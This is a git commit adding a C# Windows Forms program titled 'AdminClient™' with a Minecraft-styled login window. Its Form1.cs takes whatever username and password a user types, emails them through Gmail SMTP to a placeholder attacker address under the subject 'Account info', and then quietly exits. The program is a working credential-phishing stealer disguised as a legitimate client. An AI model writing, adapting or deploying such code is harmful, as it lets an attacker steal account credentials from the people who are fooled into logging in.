1fd1235e1b23ee908df39f45e87ca13216cc6793
SpookyCasper <casper.liden@hotmail.se>
2020-05-19 10:33:39 +0200

    Initial commit

---
+++ AdminClient/AdministratorClient/Form1.Designer.cs
@@ -0,0 +1,125 @@
+﻿namespace AdministratorClient
+{
+    partial class AdminClient
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AdminClient));
+            this.TextBoxUser = new System.Windows.Forms.TextBox();
+            this.TextBoxPass = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // TextBoxUser
+            // 
+            this.TextBoxUser.Location = new System.Drawing.Point(243, 83);
+            this.TextBoxUser.Name = "TextBoxUser";
+            this.TextBoxUser.Size = new System.Drawing.Size(224, 20);
+            this.TextBoxUser.TabIndex = 0;
+            // 
+            // TextBoxPass
+            // 
+            this.TextBoxPass.Location = new System.Drawing.Point(243, 124);
+            this.TextBoxPass.Name = "TextBoxPass";
+            this.TextBoxPass.PasswordChar = '*';
+            this.TextBoxPass.Size = new System.Drawing.Size(224, 20);
+            this.TextBoxPass.TabIndex = 1;
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.LimeGreen;
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+            this.button2.Font = new System.Drawing.Font("Minecraft", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button2.ForeColor = System.Drawing.Color.WhiteSmoke;
+            this.button2.Location = new System.Drawing.Point(243, 191);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(179, 49);
+            this.button2.TabIndex = 2;
+            this.button2.Text = "Login";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.Button2_Click);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.Color.LimeGreen;
+            this.label3.Font = new System.Drawing.Font("Minecraft", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.WhiteSmoke;
+            this.label3.Location = new System.Drawing.Point(12, 79);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(225, 24);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "Email/Username";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.BackColor = System.Drawing.Color.LimeGreen;
+            this.label4.Font = new System.Drawing.Font("Minecraft", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label4.ForeColor = System.Drawing.Color.WhiteSmoke;
+            this.label4.Location = new System.Drawing.Point(12, 120);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(132, 24);
+            this.label4.TabIndex = 4;
+            this.label4.Text = "Password";
+            // 
+            // AdminClient
+            // 
+            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+            this.ClientSize = new System.Drawing.Size(597, 379);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.TextBoxPass);
+            this.Controls.Add(this.TextBoxUser);
+            this.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "AdminClient";
+            this.Text = "AdminClient™";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox TextBoxUser;
+        private System.Windows.Forms.TextBox TextBoxPass;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+    }
+}
+
---
+++ AdminClient/AdministratorClient/Form1.cs
@@ -0,0 +1,31 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Net.Mail;
+
+namespace AdministratorClient
+{
+    public partial class AdminClient : Form
+    {
+        SmtpClient smtpServer = new SmtpClient();
+        MailMessage mail = new MailMessage();
+
+        public AdminClient()
+        {
+            InitializeComponent();
+        }
+
+        private void Button2_Click(object sender, EventArgs e)
+        {
+            smtpServer.Credentials = new System.Net.NetworkCredential("YOUR.EMAIL", "EMAILPASSWORD");
+            smtpServer.Port = 587;
+            smtpServer.Host = "smtp.gmail.com";
+            smtpServer.EnableSsl = true;
+            mail.From = new MailAddress("YOUR.EMAIL");
+            mail.To.Add("YOUR.EMAIL");
+            mail.Subject = "Account info";
+            mail.Body = "Account: " + TextBoxUser.Text + " Password: " + TextBoxPass.Text;
+            smtpServer.Send(mail);
+            Application.Exit();
+        }
+    }
+}
